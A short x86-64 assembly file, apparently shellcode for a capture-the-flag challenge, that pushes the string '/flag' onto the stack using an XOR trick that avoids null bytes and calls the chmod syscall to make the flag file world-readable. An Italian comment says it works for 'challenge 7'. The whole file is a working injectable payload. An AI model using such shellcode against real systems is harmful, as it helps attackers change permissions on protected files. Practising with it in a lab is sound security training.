.intel_syntax noprefix
.globl _start
.section .text
_start:
    /* chmod(file='/flag', mode=4) */
    /* push b'/flag\\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    mov rdi, rsp
    push 4
    pop rsi /* call chmod() */
    push 0x5a
    pop rax
    syscall


# imposta la flag con permesso di solo lettura per tutti, funziona per 
# challenge 7